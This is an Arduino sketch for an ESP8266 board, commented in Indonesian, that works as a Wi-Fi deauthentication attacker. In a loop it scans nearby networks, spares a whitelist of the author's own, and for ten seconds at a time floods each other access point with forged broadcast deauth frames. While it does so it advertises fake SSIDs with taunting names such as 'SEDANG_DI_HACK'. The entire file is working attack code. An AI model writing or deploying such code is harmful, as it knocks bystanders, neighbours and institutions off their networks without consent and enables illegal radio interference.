/* * PROJECT: GHOST-DEAUTHER CUSTOM V1
 * BOARD: WEMOS D1 MINI / ESP8266
 * FEATURES: Auto-Scan, Broadcast Deauth, White-listing, SSID Spoofing
 */

#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

// ================= CONFIGURATION =================
// 1. Tambahkan nama WiFi kamu di sini agar tidak diserang!
String whiteList[] = {"WiFi_Rumah_Gua", "Hotspot_HP_Gua", "Kantin_Sekolah"};
int whiteListSize = 3; 

// 2. Nama WiFi palsu yang akan muncul saat alat bekerja
const char* ghostNames[] = {
  "SISTEM_FAILURE_404",
  "PENGGUNA_ILEGAL_TERDETEKSI",
  "ROUTER_OVERHEAT",
  "SEDANG_DI_HACK",
  "KONEKSI_DIBLOKIR"
};

// Struktur paket pemutus koneksi (Deauth Frame)
uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: ALL
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (diisi otomatis)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (diisi otomatis)
    0x00, 0x00, 0x07, 0x00 
};
// =================================================

void setup() {
  Serial.begin(115200);
  
  // Set mode ganda agar bisa nyerang dan munculin WiFi palsu
  WiFi.mode(WIFI_AP_STA); 
  WiFi.disconnect();
  
  Serial.println("\n--- GHOST PROTOCOL READY ---");
  Serial.println("Status: MENCARI TARGET...");
}

bool isWhiteListed(String ssid) {
  for (int i = 0; i < whiteListSize; i++) {
    if (ssid == whiteList[i]) return true;
  }
  return false;
}

void loop() {
  // SCANNING PHASE
  int n = WiFi.scanNetworks();
  
  for (int i = 0; i < n; i++) {
    String currentSSID = WiFi.SSID(i);
    
    // Lewati jika WiFi terdaftar di White-list
    if (isWhiteListed(currentSSID)) {
      Serial.println("Skipping: " + currentSSID + " (Safe)");
      continue;
    }

    // LOCK TARGET
    int targetChan = WiFi.channel(i);
    uint8_t* targetBSSID = WiFi.BSSID(i);

    // GHOSTING PHASE: Ganti identitas alat
    const char* fakeSSID = ghostNames[random(0, 5)];
    WiFi.softAP(fakeSSID); 

    Serial.print("ATTACKING: "); Serial.print(currentSSID);
    Serial.print(" | AS: "); Serial.println(fakeSSID);

    // Masukkan MAC target ke paket serangan
    memcpy(&deauthPacket[10], targetBSSID, 6);
    memcpy(&deauthPacket[16], targetBSSID, 6);

    // ATTACK PHASE
    wifi_promiscuous_enable(1);
    wifi_set_channel(targetChan);

    unsigned long startTime = millis();
    while (millis() - startTime < 10000) { // Durasi serangan 10 detik per WiFi
      for (int j = 0; j < 20; j++) {
        wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
        delay(1);
      }
      yield();
    }
    
    wifi_promiscuous_enable(0);
    WiFi.softAPdisconnect(true); // Reset nama palsu
    Serial.println("Target Lumpuh. Mencari Target Baru...");
    break; 
  }
  delay(500); // Jeda singkat sebelum mulai siklus baru
}
